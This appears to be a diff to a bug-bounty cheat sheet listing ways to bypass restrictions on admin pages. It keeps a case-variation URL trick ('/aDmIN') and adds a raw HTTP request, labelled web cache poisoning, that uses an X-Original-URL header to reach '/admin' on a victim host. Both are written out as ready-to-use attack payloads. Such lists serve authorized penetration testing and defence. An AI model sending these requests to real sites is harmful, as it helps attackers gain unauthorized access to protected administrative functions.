@@ -51,4 +51,11 @@ Try this to bypass
 http://target.com/aDmIN
 ```
 
+6. Via Web Cache Poisoning
+```
+GET /anything HTTP/1.1
+Host: victim.com
+X­-Original-­URL: /admin
+```
+
 Source: [@iam_j0ker](https://twitter.com/iam_j0ker)
